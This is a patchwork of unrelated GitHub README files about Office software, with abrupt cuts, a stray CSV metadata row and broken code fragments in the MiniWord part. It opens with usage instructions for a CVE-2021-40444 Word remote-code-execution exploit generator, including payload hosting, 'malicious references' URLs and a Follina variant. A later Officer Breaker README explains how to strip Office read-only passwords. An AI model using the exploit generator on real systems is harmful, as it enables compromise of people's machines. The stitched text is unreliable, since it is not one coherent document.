The generator is designed to work on Windows, as it uses the `makecab` utility. Before usage, be sure to install required dependencies:

* With Virtualenv

```
git clone https://github.com/klezVirus/CVE-2021-40444
cd CVE-2021-40444
pip install virtualenv
python -m virtualenv venv
venv\Scripts\activate.bat 
pip install -r requirements
```

* Without Virtualenv

```
git clone https://github.com/klezVirus/CVE-2021-40444
cd CVE-2021-40444
pip install -r requirements
```

# Usage

The generator is trivial to use, and even if it has been tested with a number of different payloads and Windows
versions, it is not fail-proof. I'm encountering different behaviours across different Windows builds. As soon as
I have more details to share, I'll post them here.

```
usage: generator.py [-h] -P PAYLOAD -u URL [-o OUTPUT] [--host] [-c COPY_TO] [-nc] [-t]

[%] CVE-2021-40444 - MS Office Word RCE Exploit [%]

optional arguments:
  -h, --help            show this help message and exit
  -P PAYLOAD, --payload PAYLOAD
                        DLL payload to use for the exploit
  -u URL, --url URL     Server URL for malicious references (CAB->INF)
  -o OUTPUT, --output OUTPUT
                        Output files basename (no extension)
  --host                If set, will host the payload after creation
  -c COPY_TO, --copy-to COPY_TO
                        Copy payload to an alternate path
  -nc, --no-cab         Use the CAB-less version of the exploit
  -t, --test            Open IExplorer to test the final HTML file
```

# Example

* Generate the original exploit and test it locally

```
python generator.py -u http://127.0.0.1 -P test\calc.dll --host 
```
_Note: the port is selected by the URL, and the exploit is generated basing on the payload file extension_

* Generate the CABless exploit with RAR and test it locally via IE

```
python generator.py -u http://127.0.0.1 -P test\job-jscript.wsf --no-cab --host -t 
```

* Generate the CABless exploit (IE-only) with HTML smuggling and test it locally via IE

```
python generator.py -u http://127.0.0.1 -P test\calc.js --no-cab --host -t 
```
* 
* Generate the CABless exploit leveraging MS-MSDT (Follina attack), in both DOCX and RTF docs

```
python generator.py -u http://127.0.0.1 -P test\calc.ps1 --no-cab --host --convert
```

## What is OfficeLife

<img src=""docs/img/company.png"" alt=""OfficeLife company"" title=""OfficeLife"" />

If a company wants to have a complete 360 view of what’s happening inside its walls, it needs to buy and configure a lot of tools. There is a tool for every specific aspect of a company: HR, project management, time tracking, holidays and time offs, team management, One on Ones,... There isn't a software available today, that combine all of them together in a simple way.

Not only buying and configuring all those software is a time-consuming process, but it also costs a lot of money - especially for smaller companies with a limited budget. Moreover, most of the SAAS out there have a let's-call-us-and-talk-for-an-hour-before-you-can-see-what-the-pricing-will-look-like-for-you policy, which most people hate and that we refuse to follow.

We've created OfficeLife to provide a single source of truth for everything an employee does.

OfficeLife has the following features, in 5 major domains:

* 👋 Recruit
   * Applicant tracking system
   * Onboarding / offboarding (coming soon)

* 🥸 Manage
    * Employee management
    * Team management
    * Company management

* 👷‍♀️ Operate
    * Time tracking
    * PTOs (ie holidays and time offs) (coming soon)
    * Expenses management
    * Hardware and software licenses
    * Project management

* ☎️ Communicate
    * Work logs
    * Recent ships
    * Team and company news
    * Get to know your colleagues
    * Wikis

* 🥳 Grow
    Employee and team morale
    * One on Ones
    * Rate your manager
    * Skills
    * Objectives Key Results (OKR) (coming soon)
    * e-Coffees
    * Discipline cases

## Who is it for?

OfficeLife is aimed at small and medium size businesses, ranging from 10 to 500 employees. It's not suited for smaller teams, because it's collaborative. Also, it's not meant for huge companies as those companies usually have enough resources to manage a lot of different dedicated, specialized softwares.

OfficeLife is for companies that want one tool, simple enough for everybody, and hackable so it can fit your custom needs.

## Why did I create this software?

I'm ([https://twitter.com/djaiss](@djaiss)) a manager in a big corporation. We have a lot of tools that are not interconnected. And despite all those tools, I don't know what's going on inside the company, or how is an employee doing. OfficeLife is born out of my frustration with the lack of a single source of truth.

I wanted to open source this tool because I believe that collectively, we can build a better tool that everyone will benefit from. A lot of companies can't afford expensive softwares like Workday. By providing a free tool like OfficeLife, I wish employees around the world will enjoy their work more, and managers will be better at being managers.

## Get started

OfficeLife is open source, but it comes in several flavors so it fits everyone needs:

1. Use our hosted version. It's the same version that you will find here on GitHub (exactly the same).
2. Host the software yourself. We provide ample instructions on [our documentation portal](https://docs.officelife.io/documentation/installation.html#which-version-of-officelife-should-you-use).

## Requirements for hosting the software

- PHP 8.0 or higher,
- the PHP's intl extension,
- a database engine: preferrably mySQL or SQLite. PostegreSQL _should_ work, in theory.
- a http server: Nginx, Apache, Caddy, etc...
- We recommend [Forge](https://forge.laravel.com/) or [Ploi](https://ploi.io) to provision the servers needed to run OfficeLife. Heroku _should_ work too.

## Requirements for development

- Composer,
- Node and Yarn,
- A knowledge of how [Laravel](https://laravel.com), [VueJS](https://vuejs.org/) and [InertiaJS](https://inertiajs.com/) work. OfficeLife is a complex Laravel application, with a lot of queues and cron jobs.

## State of the project (as of September 06th, 2021)

The project is in beta right now, accessible from https://beta.officelife.io. The software might have some bugs that we are fixing as we find them.

* If you find any bugs, please file them by [creating a new issue](https://github.com/officelifehq/officelife/issues).
* Please don't submit new big ideas for now. We want to do a million other things with OfficeLife already. However, we seek feedback on the current features and how we could make them more useful.
* We have a documentation portal, that we slowly build: https://docs.officelife.io. It has a lot of content already, but we plan of adding much more before launching in beta.

## Core team

OfficeLife is made by [@djaiss](https://github.com/djaiss) and [@asbiin](https://github.com/asbiin).

We've made another project called [@monicahq](https://github.com/monicahq/monica).

## Excel spreadsheet (XLSX) format parser written in pure Swift

[![Build Status](https://dev.azure.com/CoreOffice/CoreOffice/_apis/build/status/CoreOffice.CoreXLSX?branchName=main)](https://dev.azure.com/CoreOffice/CoreOffice/_build/latest?definitionId=1&branchName=main)

CoreXLSX is a library focused on representing the low-level structure
of [the XML-based XLSX spreadsheet
format](https://en.wikipedia.org/wiki/Office_Open_XML). It allows you to open a
spreadsheet archive with `.xlsx` extension and map its internal structure into
model types expressed directly in Swift.

Important to note that this library provides read-only support only for [the `.xlsx`
format](https://en.wikipedia.org/wiki/Office_Open_XML). As the older
[legacy `.xls` spreadsheet
format](https://en.wikipedia.org/wiki/Microsoft_Excel#File_formats)
has completely different internals, please refer to [other
libraries](https://github.com/libxls/libxls) if you need to work with files of
that type.

If your `.xlsx` files use [ECMA-376 agile
encryption](https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-offcrypto/cab78f5c-9c17-495e-bea9-032c63f02ad8) (which seems to be the most popular variety), have a look at the
[CryptoOffice](https://github.com/CoreOffice/CryptoOffice) library.

Automatically generated documentation is available on [our GitHub Pages](https://coreoffice.github.io/CoreXLSX/).

[Join our Discord](https://discord.gg/H6799jh) for any questions and friendly banter.

## Example

To run the example project, clone the repo, and run `pod install` from the
Example directory first.

Model types in `CoreXLSX` directly map internal structure of XLSX format with
more sensible naming applied to a few attributes. The API is pretty simple:

```swift
import CoreXLSX

let filepath = ""./categories.xlsx""
guard let file = XLSXFile(filepath: filepath) else {
  fatalError(""XLSX file at \(filepath) is corrupted or does not exist"")
}

for wbk in try file.parseWorkbooks() {
  for (name, path) in try file.parseWorksheetPathsAndNames(workbook: wbk) {
    if let worksheetName = name {
      print(""This worksheet has a name: \(worksheetName)"")
    }

    let worksheet = try file.parseWorksheet(at: path)
    for row in worksheet.data?.rows ?? [] {
      for c in row.cells {
        print(c)
      }
    }
  }
}
```

This prints raw cell data from every worksheet in the given XLSX file. Please refer
to the [`Worksheet`
model](https://github.com/CoreOffice/CoreXLSX/blob/main/Sources/CoreXLSX/Worksheet/Worksheet.swift)
for more atttributes you might need to read from a parsed file.

### Cell references

You should not address cells via their indices in the `cells` array. Every
cell has [a `reference` property](https://github.com/CoreOffice/CoreXLSX/blob/ef0380fc2a6f1382073431244ce347708aefe09f/Sources/CoreXLSX/Worksheet/Cell.swift#L37), which you can read to understand where exactly a given cell is located. Corresponding properties on [the `CellReference` struct](https://github.com/CoreOffice/CoreXLSX/blob/ef0380fc2a6f1382073431244ce347708aefe09f/Sources/CoreXLSX/Worksheet/CellReference.swift#L18) give you the exact position of a cell.

### Empty cells

The `.xlsx` format makes a clear distinction between an empty cell and absence of a cell. If you're not getting a cell or a row when iterating through the `cells` array, this means that there is no such cell or row in your document. Your `.xlsx` document should have empty cells and rows written in it in the first place for you to be able to read them.

Making this distinction makes the format more efficient, especially for sparse spreadsheets. If you had a spreadsheet with a single cell Z1000000, it wouldn't contain millions of empty cells and a single cell with a value. The file only stores a single cell, which allows sparse spreadsheets to be quickly saved and loaded, also taking less space on the filesystem.

### Finding a cell by a cell reference

Given how the `.xlsx` format stores cells, you potentially have to iterate through all cells and build your own mapping from cell references to actual cell values. The CoreXLSX library does not currently do this automatically, and you will have to implement your own mapping if you need it. You're welcome to submit a pull request that adds such functionality as an optional step during parsing.

### Shared strings

Strings in spreadsheet internals are frequently represented as strings
shared between multiple worksheets. To parse a string value from a cell
you should use `stringValue(_: SharedStrings)` function on `Cell` together with
`parseSharedString()` on `XLSXFile`.

Here's how you can get all strings in column ""C"" for example:

```swift
if let sharedStrings = try file.parseSharedStrings() {
  let columnCStrings = worksheet.cells(atColumns: [ColumnReference(""C"")!])
    .compactMap { $0.stringValue(sharedStrings) }
}
```

To parse a date value from a cell, use `dateValue` property on the `Cell` type:

```swift
let columnCDates = worksheet.cells(atColumns: [ColumnReference(""C"")!])
  .compactMap { $0.dateValue }
```

Similarly, to parse rich strings, use the `richStringValue` function:

```swift
if let richStrings = try file.parseSharedStrings() {
  let columnCRichStrings = worksheet.cells(atColumns: [ColumnReference(""C"")!])
    .compactMap { $0.richStringValue(sharedStrings) }
}
```

### Styles

Since version 0.5.0 you can parse style information from the archive with the
new `parseStyles()` function. Please refer to the [`Styles`
model](https://github.com/CoreOffice/CoreXLSX/blob/main/Sources/CoreXLSX/Styles.swift)
for more details. You should also note that not all XLSX files contain style
information, so you should be prepared to handle the errors thrown from
`parseStyles()` function in that case.

Here's a short example that fetches a list of fonts used:

```swift
let styles = try file.parseStyles()
let fonts = styles.fonts?.items.compactMap { $0.name?.value }
```

To get formatting for a given cell, use `format(in:)` and `font(in:)` functions, passing it
the result of `parseStyles`:

```swift
let styles = try file.parseStyles()
let format = worksheet.data?.rows.first?.cells.first?.format(in: styles)
let font = worksheet.data?.rows.first?.cells.first?.font(in: styles)
```

## Reporting compatibility issues

If you stumble upon a file that can't be parsed, please [file an
issue](https://github.com/CoreOffice/CoreXLSX/issues) posting the exact error
message. Thanks to use of standard Swift `Codable` protocol, detailed errors are
generated listing a missing attribute, so it can be easily added to the model
enabling broader format support. Attaching a file that can't be parsed would
also greatly help in diagnosing issues. If these files contain any sensitive
data, we suggest obfuscating or generating fake data with same tools that
generated original files, assuming the issue can still be reproduced this way.

If the whole file can't be attached, try passing a sufficiently large value
(between 10 and 20 usually works well) to `errorContextLength` argument of
`XLSXFile` initializer. This will bundle the failing XML snippet with the debug
description of thrown errors. Please also attach the full debug description if
possible when reporting issues.

## How does it work?

Since every XLSX file is a zip archive of XML files, `CoreXLSX` uses
[`XMLCoder`](https://github.com/MaxDesiatov/XMLCoder) library and standard
`Codable` protocols to map XML nodes and atrributes into plain Swift structs.
[`ZIPFoundation`](https://www.github.com/weichsel/ZIPFoundation) is used for
in-memory decompression of zip archives. A detailed description is [available
here](https://desiatov.com/swift-codable-xlsx/).

## Requirements

**Apple Platforms**

- Xcode 11.3 or later
- Swift 5.1 or later
- iOS 9.0 / watchOS 2.0 / tvOS 9.0 / macOS 10.11 or later deployment targets

**Linux**

- Ubuntu 16.04 or later
- Swift 5.1 or later

## Installation

### Swift Package Manager

[Swift Package Manager](https://swift.org/package-manager/) is a tool for
managing the distribution of Swift code. It’s integrated with the Swift build
system to automate the process of downloading, compiling, and linking
dependencies on all platforms.

Once you have your Swift package set up, adding `CoreXLSX` as a dependency is as
easy as adding it to the `dependencies` value of your `Package.swift`.

```swift
dependencies: [
  .package(url: ""https://github.com/CoreOffice/CoreXLSX.git"",
           .upToNextMinor(from: ""0.14.1""))
]
```

If you're using CoreXLSX in an app built with Xcode, you can also add it as a direct
dependency [using Xcode's
GUI](https://developer.apple.com/documentation/xcode/adding_package_dependencies_to_your_app).

### CocoaPods

CoreXLSX is available through [CocoaPods](https://cocoapods.org) on Apple's
platforms. To install it, simply add `pod 'CoreXLSX', '~> 0.14.1'` to your
`Podfile` like shown here:

```ruby
source 'https://github.com/CocoaPods/Specs.git'
# Uncomment the next line to define a global platform for your project
# platform :ios, '9.0'
use_frameworks!
target '<Your Target Name>' do
  pod 'CoreXLSX', '~> 0.14.1'
end
```

## Contributing

### Development Workflow

On macOS the easiest way to start working on the project is to open the
`Package.swift` file in Xcode 11 or later. There is an extensive test suite that both
tests files end-to-end and isolated snippets against their corresponding model
values.

If you prefer not to work with Xcode, the project fully supports SwiftPM and the
usual workflow with `swift build` and `swift test` should work, otherwise please
[report this as a bug](https://github.com/CoreOffice/CoreXLSX/issues/new).

### Coding Style

This project uses [SwiftFormat](https://github.com/nicklockwood/SwiftFormat)
and [SwiftLint](https://github.com/realm/SwiftLint) to
enforce formatting and coding style. We encourage you to run SwiftFormat within
a local clone of the repository in whatever way works best for you either
manually or automatically via an [Xcode
extension](https://github.com/nicklockwood/SwiftFormat#xcode-source-editor-extension),
[build phase](https://github.com/nicklockwood/SwiftFormat#xcode-build-phase) or
[git pre-commit
hook](https://github.com/nicklockwood/SwiftFormat#git-pre-commit-hook) etc.

To guarantee that these tools run before you commit your changes on macOS, you're encouraged
to run this once to set up the [pre-commit](https://pre-commit.com/) hook:

```
brew bundle # installs SwiftLint, SwiftFormat and pre-commit
pre-commit install # installs pre-commit hook to run checks before you commit
```

Refer to [the pre-commit documentation page](https://pre-commit.com/) for more details
and installation instructions for other platforms.

SwiftFormat and SwiftLint also run on CI for every PR and thus a CI build can
fail with inconsistent formatting or style. We require CI builds to pass for all
PRs before merging.

### Code of Conduct

This project adheres to the [Contributor Covenant Code of
Conduct](https://github.com/CoreOffice/CoreXLSX/blob/main/CODE_OF_CONDUCT.md).
By participating, you are expected to uphold this code. Please report

nedlir,OfficerBreaker,,https://github.com/nedlir/OfficerBreaker,https://api.github.com/repos/OfficerBreaker/nedlir,OOXML password remover,"<h1> Officer Breaker</h1>

![useless_security_lock](readme/useless_lock.png)

Officer Breaker is a simple program that removes the password from read-only protected files that belong to the Office Open XML format family (***.pptx/.xlsx/.docx*** file types). 

Please read the [disclaimer](#disclaimer)  before using this program or its source code.

GUI artwork by [@Cioccolatodorima](https://twitter.com/cioccolato_kun).

## Requirements and Installation
If you wish to build the project yourself you need:
1. [JDK 8](https://openjdk.org) or JDK 11+ with [JavaFX](https://openjfx.io)
2. [Apache Ant ](https://ant.apache.org)
3. Go to the main repository folder and run:
```bash
ant -buildfile build.xml
```
4. Open the executable file from ```.dist/``` folder of this repo.

Alternatively, download the prebuilt executable directly from the [releases](https://github.com/nedlir/OfficerBreaker/releases) page.

## How does it work?
All pptx/xlsx/docx files are part of the Office Open XML format family (for further reading please refer to [OOXML Format Family -- ISO/IEC 29500 and ECMA 376
](https://www.loc.gov/preservation/digital/formats/fdd/fdd000395.shtml)).


For example, a standard ***.pptx*** file will have the following file tree structure:
```
myFile.pptx
.
├── docProps
│   ├── app.xml
│   ├── core.xml
│   ├── custom.xml
│   └── thumbnail.jpeg
├── ppt
│   ├── handoutMasters
│   ├── media
│   ├── media
│   ...
│   ...
│   ...
│   └── presentation.xml
├── _rels
│   ├── .rels
└── [Content_Types].xml
```
We can see this structure by opening the file using a program like [7zip](https://www.7-zip.org/) or by changing the filetype to ***.zip*** and then opening it.

Each OOXML file type contains an ***.xml*** file with settings and preferences, including read-only protection. In our example the security element will be located inside ```presentation.xml``` file which is located inside the ```ppt``` folder of ```myFile.pptx```.

Inside ```presentation.xml``` there is a specific element we will focus on called **p:modifyVerifier** which should look like this:

```python
<p:modifyVerifier cryptProviderType=""rsaAES"" cryptAlgorithmClass=""hash"" cryptAlgorithmType=""typeAny"" cryptAlgorithmSid=""14"" spinCount=""100000"" saltData=""3R1lmtJocEj5GzEGRn3MHA=="" hashData=""iR0jIUtVcGsTx62z/hqcbzaReLJemv$eZyqTlpWhl0Lph+osBKEiEYmyReJHmypMy6wj+VFmDGuNZvsMA9tX9g==""/>
```
The file editing is protected by a password which was salted and hashed which makes it nearly impossible to crack within reasonable time. But instead of trying to crack the password, we can just... Remove it. :shrug:

Turns out that simply deleting the security element **p:modifyVerifier** as a whole will make ```myFile.pptx``` behave as if it never had any password at all. This kind of security measure is a bit like the photo in the title of this repository - a good lock placed on the door handle... :sweat_smile:


The program will create a copy of ```presentation.xml```, parse it and delete the security element. Once the element is deleted, the *copied* ```presentation.xml``` will be replaced with the *original* ```presentation.xml``` which will effectively remove the password from ```myFile.pptx```.

What makes this whole thing worse is the fact that we could simply remove the password created by the author, alter the file in some way and then return the original password of the author by inserting the same security element which was removed. This hurts the integrity of the whole OOXML format family.

### Future changes / possible deprecation

Future versions of OOXML file type may make drastic changes of naming convention of elements or/and structure of the folders or/and files. This might make this repo deprecated but not obsolete if the same security measures will be taken in future versions.
If a ""lock with different name"" (the hashing) will be placed on the ""door handle"" (removable ```.xml``` element), the file still could be altered/edited without a password. All that's needed is to find the new security element and simply remove it from the file.

YiJiuSmile,kkFileViewOfficeEdit,,https://github.com/YiJiuSmile/kkFileViewOfficeEdit,https://api.github.com/repos/kkFileViewOfficeEdit/YiJiuSmile,"文件在线预览及OFFICE(word,excel,ppt)的在线编辑","# kkFileViewOfficeEdit
对 https://github.com/kekingcn/kkFileView/ 进行了二次开发。整合了openOffice进来，项目体积更大了！但使用和配置更简单，只需要配置redis即可

码云:https://gitee.com/253281376/kkFileViewOfficeEdit.git

### 文件在线预览使用方法
IP+端口+项目名/onlinePreview?url=你的文件地址

http://127.0.0.1:8012/onlinePreview?url=http%3A%2F%2Flocalhost%3A8080%2F1.doc

注意传递的是地址，不要下载流，url需要进行encode！

### 文档在线编辑使用方法
IP+端口+项目名/onlineEdit?url=你的文件地址&callBack=回调地址

保存文档成功后，会触发回调，onlineEdit方法调用你传递来的回调地址，并把重新生成的文档下载地址传回去（参数名：downloadPath）

本项目做为独立预览和编辑服务，考虑到有可能两个项目部署到两台不同服务器，文件不互通，所以采用这样的方式

编辑地址示例：

http://127.0.0.1:8012/onlineEdit?callBack=localhost:8080/ZsContent/saveCallBack&url=http%3A%2F%2Fwww.xdocin.com%2Fdemo%2Fdemo.docx&fileId=yourId

url需要进行encode！ 回调地址不能带http://

如果还有其它参数，可以拼接到URL后面，回调时会一并传回

回调地址示例：
http://localhost:8080/ZsContent/saveCallBack?downloadPath=http://127.0.0.1:8012/download?filename=D:/Users/chenkailing/test/a3ba6f7c-a989-4f47-8173-f795ff30a92b.doc&fileId=yourId

不兼容42版以上chrome,如需使用请切换为兼容模式，不能使用极速模式

考虑说明篇幅原因，就不贴其他格式文件的预览效果了，感兴趣的可以参考下面的实例搭建下



1. 第一步：pull项目https://github.com/yijiusmile/kkFileViewOfficeEdit.git

2. 第二步：配置redis地址，如
```
#=============================================#spring Redisson配置#===================================#
spring.redisson.address = 192.168.1.204:6379
##资源映射路径(因为jar方式运行的原因)
file.dir = C:\\Users\\yudian\\Desktop\\dev\\

```
file.dir为转换文件实际存储地址，注意要以/结尾

3. 第三步：运行FilePreviewApplication的main方法，服务启动后，访问http://localhost:8012/
会看到如下界面，代表服务启动成功

MiniWord is an easy and effective .NET Word Template library.

![image](https://user-images.githubusercontent.com/12729184/190835307-6cd87982-b5f3-4a79-9682-bdd1cc02a4ea.png)



## Getting Started

### Installation 

- nuget link : https://www.nuget.org/packages/MiniWord

### Quick Start

Template follow ""WHAT you see is what you get"" design，and the template tag styles are completely preserved.

```csharp
var value = new Dictionary<string, object>(){[""title""] = ""Hello MiniWord""};
MiniSoftware.MiniWord.SaveAsByTemplate(outputPath, templatePath, value);
```

![image](https://user-images.githubusercontent.com/12729184/190875707-6c5639ab-9518-4dc1-85d8-81e20af465e8.png)

### Input, Output

- Input support file path, byte[]
- Output support file path, byte[], stream

```csharp
SaveAsByTemplate(string path, string templatePath, Dictionary<string, object> value)
SaveAsByTemplate(string path, byte[] templateBytes, Dictionary<string, object> value)
SaveAsByTemplate(this Stream stream, string templatePath, Dictionary<string, object> value)
SaveAsByTemplate(this Stream stream, byte[] templateBytes, Dictionary<string, object> value)
```



## Tags

MiniWord template format string like Vue, React `{{tag}}`，users only need to make sure tag and value parameter key same then system will replace them automatically.

### Text

```csharp
{{tag}}
```

##### Example

```csharp
var value = new Dictionary<string, object>()
{
    [""Name""] = ""Jack"",
    [""Department""] = ""IT Department"",
    [""Purpose""] = ""Shanghai site needs a new system to control HR system."",
    [""StartDate""] = DateTime.Parse(""2022-09-07 08:30:00""),
    [""EndDate""] = DateTime.Parse(""2022-09-15 15:30:00""),
    [""Approved""] = true,
    [""Total_Amount""] = 123456,
};
MiniWord.SaveAsByTemplate(path, templatePath, value);
```

##### Template

            { ""sDate"",DateTime.Parse(""2022-09-08 08:30:00"")},
            { ""eDate"",DateTime.Parse(""2022-09-08 15:00:00"")},
            { ""How"",""Discussion requirement part1""},
            { ""Photo"",new MiniWordPicture() { Path = PathHelper.GetFile(""DemoExpenseMeeting02.png""), Width = 160, Height = 90 }},
        },
        new Dictionary<string, object>
        {
            { ""sDate"",DateTime.Parse(""2022-09-09 08:30:00"")},

### List inside list

Tag value is `IEnumerable<MiniWordForeach>` type. Adding `{{foreach` and `endforeach}}` tags to template is required.

##### Example

```csharp
var value = new Dictionary<string, object>()
{
    [""TripHs""] = new List<Dictionary<string, object>>
    {
        new Dictionary<string, object>
        {
            { ""sDate"", DateTime.Parse(""2022-09-08 08:30:00"") },
            { ""eDate"", DateTime.Parse(""2022-09-08 15:00:00"") },
            { ""How"", ""Discussion requirement part1"" },
            {
                ""Details"", new List<MiniWordForeach>()
                {
                    new MiniWordForeach()
                    {
                        Value = new Dictionary<string, object>()
                        {
                            {""Text"", ""Air""},
                            {""Value"", ""Airplane""}
                        },
                        Separator = "" | ""
                    },
                    new MiniWordForeach()
                    {
                        Value = new Dictionary<string, object>()
                        {
                            {""Text"", ""Parking""},
                            {""Value"", ""Car""}
                        },
                        Separator = "" / ""
                    }
                }
            }
        }
    }
};
MiniWord.SaveAsByTemplate(path, templatePath, value);
```

### If statement inside template

For multip paragraph, use @if and @endif tags.
For single paragraph and inside foreach, use `{{if` and `endif}}` tags to template is required.

##### Example

```csharp
var value = new Dictionary<string, object>()
{
    [""Name""] = new List<MiniWordHyperLink>(){
        new MiniWordHyperLink(){
            Url = ""https://google.com"",
            Text = ""測試連結22!!""
        },
        new MiniWordHyperLink(){
            Url = ""https://google1.com"",
            Text = ""測試連結11!!""
        }
    },
    [""Company_Name""] = ""MiniSofteware"",
    [""CreateDate""] = new DateTime(2021, 01, 01),
    [""VIP""] = true,
    [""Points""] = 123,
    [""APP""] = ""Demo APP"",
};
MiniWord.SaveAsByTemplate(path, templatePath, value);
```

    {
        Text = new DateTime(2021, 01, 01).ToString(),
        HighlightColor = ""#eb70AB"",
        FontColor = ""#ffffff"",
    },
    VIP = true,
    Points = 123,
    APP = ""Demo APP"",
};
MiniWord.SaveAsByTemplate(path, templatePath, value);
```


## Other

### POCO or dynamic parameter

v0.5.0 support POCO or dynamic parameter

```csharp
var value = new { title = ""Hello MiniWord"" };
MiniWord.SaveAsByTemplate(outputPath, templatePath, value);
```

### FontColor and HighlightColor
```csharp
var value = new
{
    Company_Name = new MiniWordColorText { Text = ""MiniSofteware"", FontColor = ""#eb70AB"" },
    Name = new MiniWordColorText { Text = ""Jack"", HighlightColor = ""#eb70AB"" },

    VIP = true,
    Points = 123,
    APP = ""Demo APP"",
};
```

### HyperLink

If value type is `MiniWordHyperLink` system will replace template string by hyperlink.

* Url： HyperLink URI target path
* Text：Description 

```csharp
var value = new 
{
    [""Name""] = new MiniWordHyperLink(){
        Url = ""https://google.com"",
        Text = ""Test Link!!""
    },

**Translators welcome! See [below](#do-you-want-to-see-the-tool-in-your-language).**

The Office RibbonX Editor is a standalone tool to edit the Custom UI part of Office open document file format. 
It contains both Office 2007 and Office 2010 custom UI schemas.

The Office 2010 custom UI schema is the latest schema and it's still being used in the latest versions of Office including
Office 2019, Office 2021 and Office 365.

To learn more about how to use these identifiers to customize the Office ribbon, backstage, and context menus visit:

## Improvements

This GitHub project is a fork of [Custom UI Editor for Microsoft Office](https://github.com/OfficeDev/office-custom-ui-editor). Built
on Windows Forms, the original editor by Microsoft is useful on its own, but it has some limitations. Rather than trying to address
those limitations by performing small contributions to the original project, this repo offers a complete redesign of the project in
Windows Presentation Foundation (WPF).

Features of this overhauled editor include:
- [ScintillaNET](https://github.com/jacobslusser/ScintillaNET) (via [SctintillaNET.WPF](https://github.com/Stumpii/ScintillaNET.WPF/tree/master/ScintillaNET.WPF)) as text editor, with seamless syntax highlighting
- The TreeView allows you to have more than one file open, easily switching between different customUI files (for example,
for copying code from one file to another)
- A multi-tab layout, allowing to have multiple files open simultaneously (including icon previews)
- List of recently opened files showing up on the file menu (thanks to 
[RecentFileList](https://www.codeproject.com/Articles/23731/RecentFileList-a-WPF-MRU))
- A `Reload on Save` option that avoids losing any external changes (for more info, see [the section below](#how-does-the-reload-on-save-option-work))
- Possibility of customizing some aspects of the editor such as font size and color
- Plus all the features of the original Windows Forms project

## Download / Build status

To download the latest release, go to the following link:

https://github.com/fernandreu/office-ribbonx-editor/releases/latest

To download the latest development build instead, go to the Artifacts section on Azure Pipelines:

https://dev.azure.com/fernandreu-public/OfficeRibbonXEditor/_build/latest?definitionId=1&branchName=master


## How does the `Reload on Save` option work?

An Office 2007+ file (`.xlsm`, `.xlam`, `.pptm`, `.docx`, etc.) is nothing more than a `.zip` file with a
custom extension. When the Office RibbonX Editor opens one of those files, it unzips it into a temporary
location first, and then it shows the content from there. To save the file, it will apply any changes to
the unzipped files, and zip everything back to its original location.

The way you would use the original Custom UI Editor is similar to the following:

1.	If the file you want to edit is open in Excel, close it first
2.	Open that file in the Custom UI Editor
3.	Edit the xml files, icons, etc.
4.	Save the file in the Custom UI Editor (and close it if you wish)
5.	Open the file back in Excel, and enjoy the changes you just made

However, **what would happen if you forget Step 1** and Excel has the same file open when you are using the
tool? Your workflow could then look like this instead:

1.	Open that file in the Custom UI Editor
2.	Edit xml files, icons, etc.
3.	You realise you had the file open in Excel, so you close it there first
    - But you also had unsaved changes in Excel, so you save the file before closing it
4.	Save the file in the Custom UI Editor (and close it if you wish)
    -	**Remember:** all this time since Step 1, the Custom UI Editor was looking at a temporary unzipped copy
    of the Excel file that did not include the changes saved in Step 3!
5.	Open the file back in Excel. The changes you made in the Custom UI Editor (Step 2) are there, but the ones
you did in Excel (Step 3) have disappeared

**The `Reload on Save` button adds an extra step to the process as a safety precaution in this scenario.** In
essence, Step 4 will no longer use the temporary unzipped copy of the Excel file that was generated in Step 1,
but will generate a new one instead. As a consequence, any external changes you might have done in the meantime
(i.e. Step 3) will no longer get lost. If you did not make any external changes, the `Reload on Save` button
won’t have any noticeable impact for you.


## Do you want to see the tool in your language?

Any help improving existing translations or adding new ones is welcome. I will add your names to a list of
acknowledgments, either in this readme or in the About section of the tool itself.

### Improving an existing translation

If you get stuck in any step, feel free to [create an issue](https://github.com/fernandreu/office-ribbonx-editor/issues/new)
and I will assist you.

1. Find the file you want to edit on this GitHub project
    1. All translations are `Strings.xyz.resx` files stored in [src/OfficeRibbonXEditor/Resources](https://github.com/fernandreu/office-ribbonx-editor/tree/master/src/OfficeRibbonXEditor/Resources)
    2. The `xyz` part is what indicates the language contained in the file
    3. For example, the Spanish translation is stored in the `Strings.es.resx` file [here](https://github.com/fernandreu/office-ribbonx-editor/blob/master/src/OfficeRibbonXEditor/Resources/Strings.es.resx)
2. Click on the `Edit` button at the top-right corner
    1. This might trigger a fork of this project under your GitHub account (otherwise, it will occur when saving any changes)
3. Make any necessary changes
    1. The `<data>` tags are essentially the string resources throughout the application
    2. Their `name` attribute is how they are being identified internally. This might provide some hints about their intended use
    3. Otherwise, there might also be a child `<comment>` tag providing more details about a particular resource
    4. Only the child `<value>` tags should need modifications
4. Save the changes at the bottom
    1. This should trigger a commit of the file in your forked repository, and perhaps a pull request to this
      repository too
    2. If the pull request does not occur automatically, you might see some buttons either in your fork or here
      to do so

### Creating a translation for a new language

These steps are recommended for people that are already a bit familiar with the Git / GitHub workflow. If this 
is not your case, please [create an issue](https://github.com/fernandreu/office-ribbonx-editor/issues/new)
instead. I will then generate a template myself, so you will be able to follow the 
[previous steps](#improving-an-existing-translation) instead of these ones.

1. Create a copy of the `Strings.resx` file [here](https://github.com/fernandreu/office-ribbonx-editor/blob/master/src/OfficeRibbonXEditor/Resources/Strings.resx), which contains the default English language
    1. If you want, you can also create the copy from an existing translation (e.g. `Strings.es.resx` for Spanish [here](https://github.com/fernandreu/office-ribbonx-editor/blob/master/src/OfficeRibbonXEditor/Resources/Strings.es.resx))
2. Name the copy `Strings.xyz.resx`, with `xyz` being your language tag
    1. For a list of available language tags, see the table in [this page](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lcid/a9eac961-e77d-41a6-90a5-ce1a8b0cdb9c)
    2. There is no need to specify the country in the language tag as well (i.e. `de`, `pt`, `ru`, etc. is enough)
3. Put the file in the same [src/OfficeRibbonXEditor/Resources](https://github.com/fernandreu/office-ribbonx-editor/tree/master/src/OfficeRibbonXEditor/Resources)
  folder where the original file was
4. Make any necessary changes to this file
    1. The `<data>` tags are essentially the string resources throughout the application
    2. Their `name` attribute is how they are being identified internally. This might provide some hints about their intended use
    3. Otherwise, there might also be a child `<comment>` tag providing more details about a particular resource
    4. Only the child `<value>` tags should need modifications
5. Modify the `LanguageChoice` class [here](https://github.com/fernandreu/office-ribbonx-editor/blob/master/src/OfficeRibbonXEditor/Helpers/LanguageChoice.cs)
  to add your new language into the `All` collection

It might be possible to perform all these steps directly in your GitHub fork via several commits. Otherwise,
you might need to have at least Git installed. Visual Studio should not be necessary unless you want to see
how your translation looks (you will be able to see it from the build artifacts of your pull request too).

